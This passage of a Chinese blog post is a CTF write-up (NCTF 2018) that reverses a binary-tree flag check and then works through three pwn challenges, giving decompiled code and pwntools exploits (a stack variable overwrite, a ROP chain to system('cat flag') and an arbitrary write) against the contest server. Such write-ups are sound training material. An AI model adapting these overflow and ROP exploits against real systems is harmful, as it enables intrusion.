puts(&quot;GG!&quot;);</span><br><span class="line">    result = 0LL;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>大致一看进行了两次与字符串比较，sub_400666：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall sub_400666(signed int a1)</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // eax</span><br><span class="line">  __int64 result; // rax</span><br><span class="line"></span><br><span class="line">  if ( a1 &lt;= 63 )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = dword_601064++;</span><br><span class="line">    *(&amp;s1 + v1) = byte_601100[a1];</span><br><span class="line">    sub_400666(2 * a1 + 1);</span><br><span class="line">    result = sub_400666(2 * (a1 + 1));</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>利用了递归函数，很明显这是将我们输入的字符串生成了一个二叉树，然后这个是是先序排序，讲生成的序列和第一次if进行比较，若正确，进入sub_4006BE函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall sub_4006BE(signed int a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  int v2; // eax</span><br><span class="line">  __int64 result; // rax</span><br><span class="line"></span><br><span class="line">  if ( a1 &lt;= 63 )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_4006BE(2 * a1 + 1, a2);</span><br><span class="line">    v2 = dword_601064++;</span><br><span class="line">    *(&amp;s1 + v2) = byte_601100[a1];</span><br><span class="line">    result = sub_4006BE(2 * (a1 + 1), a2);</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个函数是生成中序排序，将生成的字符串进行第二次if比较，如果正确的话，则我们输入的就是flag，分析一波发现二叉树生成的时候不是按照大小排序的，而是按照顺序排序的，那么我们就可以通过给出的字符串反推出flag，脚本如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">text  = &quot;abcdefghijklmnopqrstuvwxyzABCDEFJHIJKLMNOPQRSTUVWXYZ0123456789#@&quot;</span><br><span class="line"></span><br><span class="line">ciper = &quot;abdhpF@JqHIirJKsLMejtNOuPQkvRSwTUcflxVWyXYmzZ0A12gnB34C56oD78E9#&quot;</span><br><span class="line">index = []</span><br><span class="line">for x in range(len(text)):</span><br><span class="line">	index.append(ciper.index(text[x]))</span><br><span class="line">#[0, 1, 3, 7, 15, 31, 63, 32, 16, 33, 34, 8, 17, 32, 36, 18, 37, 38, 4, 9, 19, 39, 40, 20, 41, 42, 10, 21, 43, 44, 22, 45, 46, 2, 5, 11, 23, 47, 48, 24, 49, 50, 12, 25, 51, 52, 26, 53, 54, 6, 13, 27, 55, 56, 28, 57, 58, 14, 29, 59, 60, 30, 61, 62]</span><br><span class="line"></span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">for x in range(len(index)):</span><br><span class="line">	flag += DLR[index[x]]</span><br><span class="line">print &quot;NCTF&#123;&quot;+flag+&quot;&#125;&quot;</span><br></pre></td></tr></table></figure>
<p>flag：NCTF{bc2e3b4c2eb03258c5102bf9de77f57dddad9edb70c6c20febc01773e5d81947}</p>
<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="sendyouflag"><a href="#sendyouflag" class="headerlink" title="sendyouflag"></a>sendyouflag</h3><p>IDA载入查看：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main()</span><br><span class="line">&#123;</span><br><span class="line">  char v1; // [esp+8h] [ebp-10h]</span><br><span class="line">  int v2; // [esp+Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  puts(&quot;WELCOME TO PWN&quot;);</span><br><span class="line">  puts(&quot;I WILL SEND YOU FLAG&quot;);</span><br><span class="line">  puts(&quot;BUT YOU SHOULD SEND ME SOME &apos;a&apos;&quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%9s&quot;, &amp;v1);</span><br><span class="line">  if ( v2 == 1633771873 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;TQL!TQL!&quot;);</span><br><span class="line">    system(&quot;cat flag&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;HAHA you fool&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;BYE&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先用户输入一个数字V1，如果V2等于0x61616161的话，则“cat flag”，我们输入V1在[esp+8h]，V2在[esp+Ch]，并且scanf没有限制读取的长度，那么我们就可以进行覆盖掉v2</p>
<p>EXP：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">r = remote(&quot;ctfgame.acdxvfsvd.net&quot;,10001)</span><br><span class="line">token = &quot;Wl9anMOc6jNZNZo0H53t448RpcSkRPuU&quot;</span><br><span class="line">print r.recv()</span><br><span class="line">r.sendline(token)</span><br><span class="line">print r.recv()</span><br><span class="line">payload = &quot;a&quot;*8</span><br><span class="line">r.sendline(payload)</span><br><span class="line">print r.recvall()</span><br></pre></td></tr></table></figure>
<p>flag: NCTF{a1c5d9a03180782ba437ace38b33112b759807712b36e76d99f07366e9cb39e6}</p>
<h3 id="sendyousomething"><a href="#sendyousomething" class="headerlink" title="sendyousomething"></a>sendyousomething</h3><p>伪代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  int v4; // [rsp+Ch] [rbp-14h]</span><br><span class="line">  char buf; // [rsp+10h] [rbp-10h]</span><br><span class="line">  unsigned __int64 v6; // [rsp+18h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(0x28u);</span><br><span class="line">  puts(&quot;WELCOME TO PWN&quot;);</span><br><span class="line">  puts(&quot;I WILL SEND YOU FLAG&quot;);</span><br><span class="line">  puts(&quot;BUT YOU SHOULD SEND ME A ROP&quot;);</span><br><span class="line">  read(0, &amp;buf, 0x100uLL);</span><br><span class="line">  if ( v4 == 1633771873 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;TQL!TQL!&quot;);</span><br><span class="line">    system(&quot;cat flag&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;HAHA you fool&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;BYE&quot;);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>checksec一下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wxm@wxm-PC:~/Desktop$ checksec  sendyousomething</span><br><span class="line">CANARY    : ENABLED</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : Partial</span><br></pre></td></tr></table></figure>
<p>该程序开启了NX栈不可执行，CANARY栈保护，然后我们测试程序，运行发现让输入字符串，我们输入过长的字符串后，程序会返回段错误，然后我们动态调试发现当我们输入过长的字符串的时候，程序执行到leave的时候，我们输入过长的字符串会讲ebp控制，从而可以控制esp，程序中存在system函数，并且存在“cat flag”字符串，我们就可以劫持程序的流程到这个system上面去；</p>
<p>EXP：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#r = process(&quot;sendyousomething&quot;)</span><br><span class="line">r = remote(&quot;ctfgame.acdxvfsvd.net&quot;,10002)</span><br><span class="line">r_elf = ELF(&quot;sendyousomething&quot;)</span><br><span class="line">offset = 29</span><br><span class="line">token = &quot;Wl9anMOc6jNZNZo0H53t448RpcSkRPuU&quot;</span><br><span class="line">print r.recv()</span><br><span class="line">r.sendline(token)</span><br><span class="line">system_addr = 0x4004f0</span><br><span class="line">pop_rdi = 0x400723</span><br><span class="line"></span><br><span class="line">payload = &quot;a&quot;*24+p64(pop_rdi)+p64(0x40078e)+p64(system_addr)</span><br><span class="line">print r.recv()</span><br><span class="line">r.sendline(payload)</span><br><span class="line">print r.recvall()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">out：</span><br><span class="line">wxm@wxm-PC:~/Desktop$ python getflag.py </span><br><span class="line">[+] Opening connection to ctfgame.acdxvfsvd.net on port 10002: Done</span><br><span class="line">[*] &apos;/home/wxm/Desktop/sendyousomething&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">Your Token:</span><br><span class="line"></span><br><span class="line">WELCOME TO PWN</span><br><span class="line">I WILL SEND YOU FLAG</span><br><span class="line">BUT YOU SHOULD SEND ME A ROP</span><br><span class="line"></span><br><span class="line">[+] Receiving all data: Done (89B)</span><br><span class="line">[*] Closed connection to ctfgame.acdxvfsvd.net port 10002</span><br><span class="line">HAHA you fool</span><br><span class="line">BYE</span><br><span class="line">NCTF&#123;407d4c9b48fab10e561272b3416434588baf64089594703c10a619861ed8f20d&#125;</span><br></pre></td></tr></table></figure>
<p>flag：NCTF{407d4c9b48fab10e561272b3416434588baf64089594703c10a619861ed8f20d}</p>
<h3 id="SMALL-bug-I"><a href="#SMALL-bug-I" class="headerlink" title="SMALL bug I"></a>SMALL bug I</h3><p>checksec:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; checksec</span><br><span class="line">[*] &apos;/media/wxm/Lenovo/study/ctf/2018-11-24/2018nctf/pwn/bug1_d96e92d3f6aff2674ea2673afd1d15d9&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line"></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>
<p>发现仅仅开启了NX保护（栈不可执行）</p>
<p>载入ida中查看程序大致流程：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  int result; // eax</span><br><span class="line"></span><br><span class="line">  setbuf(stdin, 0LL);</span><br><span class="line">  setbuf(stdout, 0LL);</span><br><span class="line">  setbuf(stderr, 0LL);</span><br><span class="line">  sub_400766();             //第一次输入</span><br><span class="line">  sub_4007AC();             //第二次输入</span><br><span class="line">  result = dword_60108C;</span><br><span class="line">  if ( dword_60108C )       //执行“cat flag”的条件</span><br><span class="line">    result = system(&quot;cat flag&quot;);</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>执行两次输入，判断dword_60108C的真假，执行“system”，接着细看两次输入函数：</p>
<p>第一次输入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400766                 push    rbp</span><br><span class="line">.text:0000000000400767                 mov     rbp, rsp</span><br><span class="line">.text:000000000040076A                 sub     rsp, 10h</span><br><span class="line">.text:000000000040076E                 mov     edi, offset s   ; &quot;Input your name:&quot;</span><br><span class="line">.text:0000000000400773                 call    _puts</span><br><span class="line">.text:0000000000400778                 lea     rax, [rbp+buf]</span><br><span class="line">.text:000000000040077C                 mov     edx, 10h        ; nbytes</span><br><span class="line">.text:0000000000400781                 mov     rsi, rax        ; buf</span><br><span class="line">.text:0000000000400784                 mov     edi, 0          ; fd</span><br><span class="line">.text:0000000000400789                 mov     eax, 0</span><br><span class="line">.text:000000000040078E                 call    _read</span><br><span class="line">.text:0000000000400793                 lea     rax, [rbp+buf]</span><br><span class="line">.text:0000000000400797                 mov     rsi, rax</span><br><span class="line">.text:000000000040079A                 mov     edi, offset format ; &quot;Hello, %s\n&quot;</span><br><span class="line">.text:000000000040079F                 mov     eax, 0</span><br><span class="line">.text:00000000004007A4                 call    _printf</span><br><span class="line">.text:00000000004007A9                 nop</span><br><span class="line">.text:00000000004007AA                 leave</span><br><span class="line">.text:00000000004007AB                 retn</span><br></pre></td></tr></table></figure></p>
<p>输入地址是距离rbp为10的在栈上的位置，最大限度可以填0x10个</p>
<p>第二次：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004007AC                 push    rbp</span><br><span class="line">.text:00000000004007AD                 mov     rbp, rsp</span><br><span class="line">.text:00000000004007B0                 sub     rsp, 10h</span><br><span class="line">.text:00000000004007B4                 mov     edi, offset aInputYourNumbe ; &quot;Input your number:&quot;</span><br><span class="line">.text:00000000004007B9                 call    _puts</span><br><span class="line">.text:00000000004007BE                 mov     rax, [rbp+var_8]</span><br><span class="line">.text:00000000004007C2                 mov     rsi, rax</span><br><span class="line">.text:00000000004007C5                 mov     edi, offset aLld ; &quot;%lld&quot;</span><br><span class="line">.text:00000000004007CA                 mov     eax, 0</span><br><span class="line">.text:00000000004007CF                 call    ___isoc99_scanf</span><br><span class="line">.text:00000000004007D4                 mov     edi, offset aThatSGood ; &quot;That&apos;s good!&quot;</span><br><span class="line">.text:00000000004007D9                 call    _puts</span><br><span class="line">.text:00000000004007DE                 nop</span><br><span class="line">.text:00000000004007DF                 leave</span><br><span class="line">.text:00000000004007E0                 retn</span><br></pre></td></tr></table></figure>
<p>输入地址是距离rbp为8的栈上存储的位置，这个位置我们可以通过第一次输入控制，所以这里可以造成任意地址写，后面要进行判断的是0x60108c,那么我们就可以通过这两次输入来覆盖掉0x60108c原先的值，EXP：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.terminal = [&apos;deepin-terminal&apos;, &apos;-x&apos;, &apos;sh&apos; ,&apos;-c&apos;]</span><br><span class="line"># r = process(&quot;bug1_d96e92d3f6aff2674ea2673afd1d15d9&quot;)</span><br><span class="line">r = remote(&quot;ctfgame.acdxvfsvd.net&quot;,11001) </span><br><span class="line">token = &quot;Wl9anMOc6jNZNZo0H53t448RpcSkRPuU&quot;</span><br><span class="line">print r.recv()</span><br><span class="line">r.sendline(token)</span><br><span class="line">payload = &quot;w&quot;*8+p64(0x60108c)</span><br><span class="line">print r.recv()</span><br><span class="line">r.sendline(payload)</span><br><span class="line">print payload</span><br><span class="line">print r.recv()</span><br><span class="line">r.sendline(&quot;123&quot;)</span><br><span class="line">print r.recvall()</span><br></pre></td></tr></table></figure>

        
        <br>
        <div id="comment-container">
        </div>
        <div id="disqus_thread"></div>

        <div id="lv-container">
        </div>

    </div>
</div>

    </div>
</div>


<footer class="footer">
    <ul class="list-inline text-center">
        
        

        

        

        

        

    </ul>
    
    <p>
        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
        转发请备注<a href="“https://luobuming.github.io”">一筐萝卜</a>的个人博客 <br>
        本站总访问量<span id="busuanzi_value_site_pv"></span>次
       </p>
</footer>




</body>

<script>
    // We expose some of the variables needed by the front end
    window.hexo_search_path = "search.json"
    window.hexo_root = "/"
    window.isPost = true
</script>
<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
<script src="/js/index.js"></script>
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>




</html>
